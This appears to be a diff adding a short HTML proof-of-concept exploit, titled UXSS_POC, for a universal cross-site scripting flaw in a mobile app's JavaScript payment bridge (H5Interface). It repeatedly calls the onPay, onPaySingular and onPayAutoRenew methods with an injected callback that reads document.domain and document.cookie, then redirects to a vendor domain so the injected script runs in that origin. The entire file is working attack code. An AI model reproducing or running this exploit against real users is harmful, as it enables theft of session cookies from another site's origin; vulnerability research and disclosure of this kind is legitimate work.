@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>UXSS_POC</title></head>
+<body>
+<script>
+var payData = JSON.stringify({
+    "appId": "x", "tradeType": "x", "bizContent": "x",
+    "method": "x", "version": "1.0", "sign": "x", "signType": "RSA2"
+});
+
+var evilCb = "document.title='UXSS_DOMAIN='+document.domain+'_COOKIE='+document.cookie//";
+
+for (var i = 0; i < 500; i++) {
+    try { H5Interface.onPay(payData, evilCb); } catch(e) {}
+    try { H5Interface.onPaySingular(payData, evilCb); } catch(e) {}
+    try { H5Interface.onPayAutoRenew(payData, evilCb); } catch(e) {}
+}
+
+window.location.href = "https://www.vivo.com.cn/";
+</script>
+</body>
+</html>
